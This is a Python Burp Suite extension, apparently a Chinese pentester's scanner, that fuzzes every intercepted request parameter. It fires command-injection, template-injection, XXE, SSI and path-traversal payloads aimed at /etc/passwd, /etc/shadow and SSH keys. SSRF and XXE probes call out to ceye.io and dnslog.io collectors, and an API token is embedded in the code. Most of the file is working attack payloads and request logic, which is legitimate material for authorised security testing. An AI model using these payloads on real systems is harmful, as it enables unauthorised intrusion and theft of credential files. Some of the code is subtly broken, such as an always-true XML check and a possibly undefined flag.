#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Time    : 2019/10/22 15:41
# @Author  : xiaodong
# @github  : https://github.com/dongfangyuxiao/BurpExtend/
# @Site    : #编写这个插件测试是否存在任意文件读取和下载漏洞
# @File    : burp_LFI.py
# @Software: PyCharm
import threading
import re
from burp import IBurpExtender
from burp import IHttpListener
from burp import IHttpRequestResponse
from burp import IResponseInfo
from burp import IRequestInfo
from burp import IHttpService
from burp import IScannerCheck
from burp import IScannerInsertionPointProvider
from burp import IParameter
from burp import IScanIssue
from urlparse import urlparse
from java.net import URL
import urllib2
import sys
sys.path.append('C:/Python27/Lib/site-packages')
import random
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)  # 屏蔽ssl警告
class FuzzLFI:
    def __init__(self):
        # 任意文件读取敏感目录
        self.dir = [
            '&&net user',
            '&&cat /etc/passwd',
            '&net user',
            '&cat /etc/passwd',
            '&;&net user',
            '&;&cat /etc/passwd',
            '|net user',
            '|cat /etc/passwd',
            #上面是命令执行漏洞的
           'file:///etc/passwd',
           'dict://127.0.0.1:22',
           'local_file:///etc/passwd',
           'local-file:///etc/passwd',
           #这是ssrf的file协议和dict协议
           "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
           "<!DOCTYPE root [\n" +
           "<!ENTITY % remote SYSTEM \"file:///etc/passwd\">\n" +
           "%remote;]>\n" +
            "<root/>",
           #这是xxe的file协议读取 / etc / passwd
            "phpinfo()",
            "system('id')",
            "system('whoami')",
            "system('cat /etc/passwd')",
            "${@print(md5(31337))}",
            #这是php代码执行
            "<!--#exec cmd=\"id\" -->",
            "<!--#exec cmd=\"cat /etc/passwd\" -->",
            #这是SSI注入
            '${233*233}',
            '@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(\'id\').getInputStream())',
            '${{233*233}}',
            '<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }',
            '{self::getStreamVariable($SCRIPT_NAME)}',
            '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}',
            '233*233',
            '{{233*233}}',
             '<%= 233 * 233 %>',
            '<%= File.open(\'/etc/passwd\').read %>',
            '{php}echo \'id\';{/php}',
            '$eval(\'233*233\')',
            "{% import os %}{{ os.popen(\"id\").read() }",
            #以上是模板注入
            '/etc/passwd',
            '../logs/access_log',
            '../logs/error_log',
            '/etc/shadow',
            '/etc/group',
            'proc/self/environ',
            '/proc/self/environ',
            '/proc/self/cmdline',
            '/proc/self/stat',
            '/proc/self/status',
            '/proc/self/fd/0',
            '/var/cpanel/cpanel.config',
            '/../etc/passwd',
            '/../../etc/passwd',
            '/../../../etc/passwd',
            '/../../../../etc/passwd',
            '/../../../../../etc/passwd',
            '/../../../../../../etc/passwd',
            '/../../../../../../../etc/passwd',
            '/../../../../../../../../etc/passwd',
            '/../../../../../../../../../etc/passwd',
            '/../../../../../../../../../../etc/passwd',
            '/../../../../../../../../../../../etc/passwd',
            '/../../../../../../../../../../../../etc/passwd',
            '/../../../../../../../../../../../../../etc/passwd',
            '/../../../../../../../../../../../../../../etc/passwd',
            '/../../../../../../../../../../../../../../../../etc/passwd',
            '/../proc/self/environ',
            'proc/self/environ%00',
            '../proc/self/fd/8',
            '../proc/self/fd/8%00',
            '/etc/security/group',
            '/etc/security/passwd',
            '/etc/security/user',
            '/etc/security/environ',
            '/etc/security/limits',
            '/usr/lib/security/mkuser.default',
            '/apache/logs/access.log',
            '/apache/logs/error.log',
            '/etc/httpd/logs/acces_log',
            '/etc/httpd/logs/error_log',
            '/var/www/logs/access_log',
            '/usr/local/apache/logs/access_log',
            '/../../apache/logs/access.log',
            '/../../../apache/logs/access.log',
            '/../../../../apache/logs/access.log',
            '/logs/access_log',
            '/logs/error_log',
            '/../../logs/error_log',
            '/../../../logs/access_log',
            '/../../../../logs/error_log',
            '/../../../../../logs/error_log',
            '/../../../../../../logs/error_log',
            '/../../../../../../../logs/error_log',
            '/../../logs/access_log',
            '/../../../../logs/access_log',
            '/../../../../../logs/access_log',
            '/../../../../../../logs/access_log',
            '/../../../../../../../logs/access_log',
            '/etc/php.ini',
            '/bin/php.ini',
            '/etc/httpd/php.ini',
            '/WINDOWS\php.ini',
            '/WINNT\php.ini',
            '/apache\php\php.ini',
            '/Volumes/Macintosh_HD1/usr/local/php/lib/php.ini',
            '/usr/local/cpanel/logs',
            'C:/boot.ini',
            'c:/wamp/logs/access.log',
            '/etc/logrotate.d/proftpd',
            '/../etc/passwd%00',
            '/../../etc/passwd%00',
            '/../../../etc/passwd%00',
            '/../../../../etc/passwd%00',
            '/../../../../../etc/passwd%00',
            '/../../../../../../etc/passwd%00',
            '/../../../../../../../etc/passwd%00',
            '/../../../../../../../../etc/passwd%00',
            '/../../../../../../../../../etc/passwd%00',
            '/../../../../../../../../../../etc/passwd%00',
            '/../../../../../../../../../../../etc/passwd%00',
            '/../../../../../../../../../../../../etc/passwd%00',
            '/../../../../../../../../../../../../../etc/passwd%00',
            '/../../../../../../../../../../../../../../etc/passwd%00',
            '/../../../../../../../../../../../../../../../../etc/passwd%00',
            '/../WEB-INF/web.xml',
            '/../../WEB-INF/web.xml',
            '/../../../WEB-INF/web.xml',
            '/../../../../WEB-INF/web.xml',
            '/../../../../../WEB-INF/web.xml',
            '/../../../../../../WEB-INF/web.xml',
            '/../../../../../../..//WEB-INF/web.xml',
            '/_plugin/head/../../../../../../../../../etc/passwd	',
            '/theme/META-INF%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afdomains/domain1/config/admin-keyfile',
                      ]
        self.errorFlag = re.compile(r'.*(root:|sbin|State: R (running)|Tgid:|TracerPid:|Uid:|File does not exist:|emailusersbandwidth|adminuser=|database_prefix=|nologin|DB_NAME|daemon:|DOCUMENT_ROOT=|PATH="|HTTP_USER_AGENT|HTTP_ACCEPT_ENCODING=|apache_port=|cpanel/logs/access|allow_login_autocomplete|54289|6f3249aa304055d63828af3bfab778f6).*')

        self.dir2 = [
            'etc/passwd',
            '../logs/access_log',
            '../logs/error_log',
            'etc/shadow',
            '../etc/passwd',
            '../../etc/passwd',
            '../../../etc/passwd',
            '../../../../etc/passwd',
            '../../../../../etc/passwd',
            '../../../../../../etc/passwd',
            '../../../../../../../etc/passwd',
            '../../../../../../../../etc/passwd',
            '../../../../../../../../../etc/passwd',
            '../../../../../../../../../../etc/passwd',
            '../../../../../../../../../../../etc/passwd',
            '../../../../../../../../../../../../etc/passwd',
            '../../../../../../../../../../../../../etc/passwd',
            '../../../../../../../../../../../../../../etc/passwd',
            '../../../../../../../../../../../../../../../../etc/passwd',
            '../../logs/access_log',
            '../../../../logs/access_log',
            '../../../../../logs/access_log',
            '../../../../../../logs/access_log',
            '../../../../../../../logs/access_log',
            '../etc/passwd%00',
            '../../etc/passwd%00',
            '../../../etc/passwd%00',
            '../../../../etc/passwd%00',
            '../../../../../etc/passwd%00',
            '../../../../../../etc/passwd%00',
            '../../../../../../../etc/passwd%00',
            '../../../../../../../../etc/passwd%00',
            '../../../../../../../../../etc/passwd%00',
            '../../../../../../../../../../etc/passwd%00',
            '../../../../../../../../../../../etc/passwd%00',
            '../../../../../../../../../../../../etc/passwd%00',
            '../../../../../../../../../../../../../etc/passwd%00',
            '../../../../../../../../../../../../../../etc/passwd%00',
            '../../../../../../../../../../../../../../../../etc/passwd%00',
            'WEB-INF/web.xml',
            '../WEB-INF/web.xml',
            '../../WEB-INF/web.xml',
            '../../../WEB-INF/web.xml',
            '../../../WEB-INF/web.xml',
            '../../../../WEB-INF/web.xml',
            '../../../../../WEB-INF/web.xml',
            '../../../../../../WEB-INF/web.xml',
            '../../../../../../../WEB-INF/web.xml',
            '../../../../../../../../WEB-INF/web.xml',
            '../../../../../../../../../../WEB-INF/web.xml',
            'config/config_ucenter.php.bak',
            'config/.config_ucenter.php.swp',
            'config/.config_global.php.swp',
            'config/config_global.php.1',
            'uc_server/data/config.inc.php.bak',
            'config/config_global.php.bak',
            'include/config.inc.php.tmp',
            # discuz敏感目录，正则匹配<?php>
            'access.log',
            'www.log',
            'error.log',
            'log.log',
            'sql.log',
            'errors.log',
            'debug.log',
            'db.log',
            'install.log',
            'server.log',
            'sqlnet.log',
            'WS_FTP.log',
            'database.log',
            'data.log',
            'app.log',
            'log.tar.gz',
            'log.rar',
            'log.zip',
            'log.tgz',
            'log.tar.bz2',
            'log.7z',
            # 日志文件
            'WEB-INF/classes',
            'jPlayer/',
            'jwplayer/',
            'extjs/',
            'swfupload/',
            'boss/',
            'editor/',
            'ckeditor/',
            'htmedit/',
            'htmleditor/',
            'ueditor/',
            'tomcat/',
            'output/',
            'fck/',
            'cgi-bin/',
            'admin/',
            'bak/',
            'backup/',
            'conf/',
            'config/',
            'debug/',
            'data/',
            'database/',
            'deploy/',
            'WEB-INF/',
            'install/',
            'manage/',
            'manager/',
            'monitor/',
            'tmp/',
            'temp/',
            'test/',
            'RPC2/',
            'wp-config.php.inc',
            'wp-config.inc',
            'wp-config.bak',
            'wp-config.php~',
            '.wp-config.php.swp',
            'wp-config.php.bak',
            'auto/config',
            'configprops',
            'beans',
            'dump',
            'env',
            'env/{name}',
            'health',
            'info',
            'metrics',
            'shutdown',
            'trace',
            'manage/',
            '.svn/entries',
            'code',
            'phpmyadmin',
            'cache/',
            'compile/',
            'data1/',
            'entries/',
            'storage/',
            'upload/',
            'add/',
            'test.zip',
            '.zip',
            'www.rar',
            'foo/default/master/..%252F..%252F..%252F..%252Fetc%252fpasswd',
            '..%252F..%252F..%252F..%252Fetc%252fpasswd',
            '.bash_history',
            'upfile.aspx',
            'vendor/',
            '/resin-doc/viewfile/',
            '.buildpath',
            '.history',
            '.mysql_history',
            '.project',
            '.ssh/authorized_keys',
            'mydata/',
            'cacti/',
            'cms/',
            'main/',
            'db/',
            'dede/',
            'denglu/',
            'edit/',
            'setting/',
            'sys/',
            'axis2/',
            'ecp/',
            'reg/',
            'register/',
            'sign/',
            'download.jsp',
            'wls-wsat/CoordinatorPortType',
            'console/',
            'ws_utc/',
            'uddiexplorer/',
            'safe.cgi',
            'victim.cgi',
            'CFIDE/',
            'administrator/',
            'examples/'



        ]

class BurpExtender(IBurpExtender,IScannerCheck):

    def registerExtenderCallbacks(self,callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        self._callbacks.registerScannerCheck(self)
        self._callbacks.setExtensionName("LFI")
        print("for lfi scan")
        self.fuzzLFI = FuzzLFI()
        self.dirList = []


    def doPassiveScan(self, baseRequestResponse):
        lfiTarget = []

        Request = baseRequestResponse.getRequest()
        Response = baseRequestResponse.getResponse()
        analyzedRequest, reqHeaders, reqBodys, reqMethod, reqParameters= self.get_request_info(Request )

        ResHeaders, ResBodys, ResStatusCode,resLength= self.get_response_info(Response)
        httpService = baseRequestResponse.getHttpService()
        host, port, protocol, ishttps, = self.get_server_info(httpService)
        if "?xml" in reqBodys or ("xml" or "*/*" in reqHeaders):
            xxeBodyFlag = True
        url = self.get_request_url(protocol, reqHeaders,host,port)
        if (1==1):

            for parameter in reqParameters:
                parameterName, parameterValue, parameterType = self.get_parameter_Name_Value_Type(parameter)

                if parameterType ==0 or parameterType ==1 :

                    if xxeBodyFlag:
                        tXXEPara = threading.Thread(target=self.xxeParameter, args=(
                        Request, protocol, host, port, ishttps, parameterName, parameterValue, parameterType))
                        tXXEPara2 = threading.Thread(target=self.xxeParameter2, args=(
                            Request, protocol, host, port, ishttps, parameterName, parameterValue, parameterType))
                    tLfi = threading.Thread(target=self.lfiTest, args=(
                        Request, protocol, host, port, ishttps, parameterName, parameterValue, parameterType))
                    tSSRF = threading.Thread(target=self.ssrfHttp, args=(
                        Request, protocol, host, port, ishttps, parameterName, parameterValue, parameterType,ResStatusCode))
                    tSSRF2 = threading.Thread(target=self.ssrfHttp2, args=(
                        Request, protocol, host, port, ishttps, parameterName, parameterValue, parameterType))


                    lfiTarget.append(tXXEPara)
                    lfiTarget.append(tXXEPara2)
                    lfiTarget.append(tLfi)
                    lfiTarget.append(tSSRF)
                    lfiTarget.append(tSSRF2)
            url = urlparse(url)
            url = url.scheme + '://' + url.netloc + "/".join(url.path.split('/')[0:-1]) + "/"


            if (url not in self.dirList) and (
                    ResStatusCode != 302 and ResStatusCode != 301):  # 如果本身就是一个跳转的页面，或者已经扫描过了，我们就不管了
                print url
                self.dirList.append(url)
                html404_status, html404_content = self.html_404_analyze(url)
                tLfiDir = threading.Thread(target=self.lfiDir, args=(
                    Request, protocol, host, port, ishttps, url, html404_status, html404_content))
                lfiTarget.append(tLfiDir)
        for x in lfiTarget:
            x.start()
        for x in lfiTarget:
            x.join()
                #else:
                    #pass

    def consolidateDuplicateIssues(self, existingIssue, newIssue):

        return 0

    def doActiveScan(self, baseRequestResponse, insertionPoint):
            # report the issue
            return None

    def lfiTest(self, request, protocol, host, port, ishttps, parameterName, parameterValue, parameterType):
        for paraNewValue in self.fuzzLFI.dir:
            paraNewValue= urllib2.quote(paraNewValue)
            newParameter = self._helpers.buildParameter(parameterName, paraNewValue, parameterType)
            newRequest = self._helpers.updateParameter(request, newParameter)
            #print(newRequest)
            newResponse = self._callbacks.makeHttpRequest(host, port, ishttps, newRequest)
            newAnalyzedRequest, newReqHeaders, newReqBodys, newReqMethod, newReqParameters = self.get_request_info(
                newRequest)


            newResHeaders, newResBodys, newResStatusCode,resLength= self.get_response_info(newResponse)

            errorInject = self.fuzzLFI.errorFlag.findall(newResBodys)

            if errorInject:

                newReqUrl = self.get_request_url(protocol, newReqHeaders,host,port)
                content = '[+]{} ->{} {}\n[Headers] -> {}\n[Bodys] -> {}'.format('[LFI GET]',errorInject,newReqUrl, newReqHeaders, newReqBodys)
                print (content)
                self.save(content+'\t\n')
                print ('-' * 50)
                break



    def lfiDir(self, request, protocol, host, port, ishttps, url,html404_status, html404_content):
        for paraNewValue in self.fuzzLFI.dir2:
            newRequest = self._helpers.buildHttpRequest(URL(url+paraNewValue))
            #print(url+paraNewValue)
            newResponse = self._callbacks.makeHttpRequest(host, port, ishttps, newRequest)
            newAnalyzedRequest, newReqHeaders, newReqBodys, newReqMethod, newReqParameters = self.get_request_info(
                newRequest)

            newResHeaders, newResBodys, newResStatusCode, resLength = self.get_response_info(
                newResponse)

            errorInject = self.fuzzLFI.errorFlag.findall(newResBodys)

            if errorInject  or (newResStatusCode == 206) or ((newResStatusCode == 200 or newResStatusCode == 302 or newResStatusCode == 301) and abs(resLength - len(html404_content))>50):
                newReqUrl = self.get_request_url(protocol, newReqHeaders,host,port)
                content = '[+]{} ->{} {}\n[Headers] -> {}\n[Bodys] -> {}'.format('[DIR GET]',errorInject,newReqUrl, newReqHeaders, newReqBodys)
                print(content)
                self.save(content + '\t\n')
                print('-' * 50)
                break




    def html_404_analyze(self, url):
        url = url+'justfortesthtmlshifoucunzai.html'
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Accept-Encoding": "gzip, deflate"
        }
        try:
            html_404 = requests.get(url,headers=headers,timeout=5,verify=False)
            return html_404.status_code,html_404.content
        except Exception as e:
            return None,None
            pass

    def ssrfHttp(self, request, protocol, host, port, ishttps, parameterName, parameterValue, parameterType,ResStatusCode):
        paraNewValue = 'http://'+host+'.m4mta5.ceye.io/'+host+parameterName+"testssrf1234567890"
        newParameter = self._helpers.buildParameter(parameterName, paraNewValue, parameterType)
        newRequest = self._helpers.updateParameter(request, newParameter)
            #print(newRequest)
        newResponse = self._callbacks.makeHttpRequest(host, port, ishttps, newRequest)
        newAnalyzedRequest, newReqHeaders, newReqBodys, newReqMethod, newReqParameters = self.get_request_info(
                newRequest)


        newResHeaders, newResBodys, newResStatusCode,resLength= self.get_response_info(newResponse)

        pattern = re.compile(host + parameterName + "testssrf1234567890" )
        response = self.ceyeFin()
        result = pattern.findall(response)

        if result:
            newReqUrl = self.get_request_url(protocol, newReqHeaders,host,port)

            content = '[+]{} -> {}\n[Headers] -> {}\n[Bodys] -> {}'.format('[SSRF GET]',newReqUrl, newReqHeaders, newReqBodys)
            print (content)
            self.save(content + '\t\n')
            print ('-' * 50)


        if (paraNewValue in "".join(newResHeaders) and newResStatusCode!=ResStatusCode):
            newReqUrl = self.get_request_url(protocol, newReqHeaders,host,port)
            content = '[+]{} -> {}\n[Headers] -> {}\n[Bodys] -> {}'.format('[URL GET]', newReqUrl, newReqHeaders,
                                                                           newReqBodys)
            print (content)
            self.save(content + '\t\n')
            print ('-' * 50)

    def ssrfHttp2(self, request, protocol, host, port, ishttps, parameterName, parameterValue, parameterType):
        paraNewValue = 'http://' + host +'.'+ parameterName + 'ssrf.dongfangyuxiao.l.dnslog.io/' + host + parameterName + "testssrf1234567890"
        newParameter = self._helpers.buildParameter(parameterName, paraNewValue, parameterType);
        newRequest = self._helpers.updateParameter(request, newParameter)
        # print(newRequest)
        newResponse = self._callbacks.makeHttpRequest(host, port, ishttps, newRequest)
        newAnalyzedRequest, newReqHeaders, newReqBodys, newReqMethod, newReqParameters = self.get_request_info(
            newRequest)
        newResHeaders, newResBodys, newResStatusCode, resLength = self.get_response_info(
            newResponse)

    def ceyeFin(self):
        headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36',
                    'Content-Type': 'application/json; charset=utf-8'}
        url = 'http://api.ceye.io/v1/records?token=23715ab222a6e221916405658caf5061&type=http'
        response = requests.get(url,headers =headers,timeout=15).text
        return response

    def xxeParameter(self, request, protocol, host, port, ishttps, parameterName, parameterValue, parameterType):

        paraNewValue = ("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                      "<!DOCTYPE root [\n" +
                      "<!ENTITY % remote SYSTEM \"http://" +host+ ".m4mta5.ceye.io/" + host + parameterName + "xxetestparameter" + "\">\n" +
                      "%remote;]>\n" +
                      "<root/>")

        newParameter = self._helpers.buildParameter(parameterName, paraNewValue, parameterType)
        newRequest = self._helpers.updateParameter(request, newParameter)
            #print(newRequest)
        newResponse = self._callbacks.makeHttpRequest(host, port, ishttps, newRequest)
        newAnalyzedRequest, newReqHeaders, newReqBodys, newReqMethod, newReqParameters = self.get_request_info(
                newRequest)

        newResHeaders, newResBodys, newResStatusCode,resLength= self.get_response_info(newResponse)

        pattern = re.compile(host + parameterName + "xxetestparameter" )
        response = self.ceyeFin()
        result = pattern.findall(response)
        if result:
            newReqUrl = self.get_request_url(protocol, newReqHeaders,host,port)
            content = '[+]{} -> {}\n[Headers] -> {}\n[Bodys] -> {}'.format('[XXE Parameter GET]',newReqUrl, newReqHeaders, newReqBodys)
            print (content)
            self.save(content + '\t\n')
            print ('-' * 50)

    def xxeParameter2(self, request, protocol, host, port, ishttps, parameterName, parameterValue, parameterType):

        paraNewValue = ("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                      "<!DOCTYPE root [\n" +
                      "<!ENTITY % remote SYSTEM \"http://" +host+"xxepara.dongfangyuxiao.l.dnslog.io/" + host + parameterName + "xxetestparameter" + "\">\n" +
                      "%remote;]>\n" +
                      "<root/>")

        newParameter = self._helpers.buildParameter(parameterName, paraNewValue, parameterType)
        newRequest = self._helpers.updateParameter(request, newParameter)
            #print(newRequest)
        newResponse = self._callbacks.makeHttpRequest(host, port, ishttps, newRequest)
        newAnalyzedRequest, newReqHeaders, newReqBodys, newReqMethod, newReqParameters = self.get_request_info(
                newRequest)

        newResHeaders, newResBodys, newResStatusCode,resLength= self.get_response_info(newResponse)


    def xxeBody(self, request, protocol, host, port, ishttps,reqHeaders):

        xxePayload = ("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                      "<!DOCTYPE root [\n" +
                      "<!ENTITY % remote SYSTEM \"http://" +host+ ".m4mta5.ceye.io/" + host + "xxebody" + "\">\n" +
                      "%remote;]>\n" +
                      "<root/>")
        reqHeaders[0].split(' ')[0]="POST"
        xxe = self._helpers.buildHttpMessage(reqHeaders, xxePayload)
        newResponse = self._callbacks.makeHttpRequest(host, port, ishttps, xxe)
        pattern = re.compile(host+'xxebody')
        response = self.ceyeFin()
        result = pattern.findall(response)
        if result:
            newReqUrl = self.get_request_url(protocol, reqHeaders,host,port)
            content = '[+]{} -> {}\n[Headers] -> {}\n[Bodys] -> {}'.format('[XXE Body GET]',newReqUrl, reqHeaders, xxePayload)
            print (content)
            self.save(content + '\t\n')
            print ('-' * 50)


    def xxeBody2(self, request, protocol, host, port, ishttps,reqHeaders):

        xxePayload = ("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                      "<!DOCTYPE root [\n" +
                      "<!ENTITY % remote SYSTEM \"http://" +host+".xxebody.dongfangyuxiao.l.dnslog.io/" + host + "xxebody" + "\">\n" +
                      "%remote;]>\n" +
                      "<root/>")
        reqHeaders[0].split(' ')[0]="POST"
        xxe = self._helpers.buildHttpMessage(reqHeaders, xxePayload)
        newResponse = self._callbacks.makeHttpRequest(host, port, ishttps, xxe)


    def get_response_info(self, response):
        analyzedResponse = self._helpers.analyzeResponse(
            response)
        resHeaders = analyzedResponse.getHeaders()
        resBodys = response[
                   analyzedResponse.getBodyOffset():].tostring()
        resStatusCode = analyzedResponse.getStatusCode()
        resLength = len(resBodys)
        return resHeaders, resBodys, resStatusCode, resLength


    def get_server_info(self, httpService):
        host = httpService.getHost()
        port = httpService.getPort()
        protocol = httpService.getProtocol()
        ishttps = False
        if protocol == 'https':
            ishttps = True
        return host, port, protocol, ishttps


    def get_parameter_Name_Value_Type(self, parameter):
        parameterName = parameter.getName()
        parameterValue = parameter.getValue()
        parameterType = parameter.getType()
        return parameterName, parameterValue, parameterType

        # 获取请求的url

    def get_request_url(self, protocol, reqHeaders, host, port):
        link = reqHeaders[0].split(' ')[1]

        if link.startswith('http'):
            return link
        else:
            return protocol + '://' + host + ":" + str(port) + link

    def save(self, content):
        #print(content)
        f = open('burp_lfi.txt', 'at')
        f.writelines(content + '\n\n')
        f.close()

    def saveUrl(self, content):

        f = open('burp_url.txt', 'at')
        f.writelines(content + '\n\n')
        f.close()

    def get_request_info(self, request):
        analyzedRequest = self._helpers.analyzeRequest(
            request)  # analyzeRequest用于分析HTTP请求，并获取有关它的各种关键详细信息。生成的IRequestInfo对象
        reqHeaders = analyzedRequest.getHeaders()  # 用于获取请求中包含的HTTP头。返回：请求中包含的HTTP标头。
        reqBodys = request[analyzedRequest.getBodyOffset():].tostring()  # 获取消息正文开始的请求中的偏移量。返回：消息正文开始的请求中的偏移量。
        reqMethod = analyzedRequest.getMethod()  # 获取请求方法
        reqParameters = analyzedRequest.getParameters()
        return analyzedRequest, reqHeaders, reqBodys, reqMethod, reqParameters


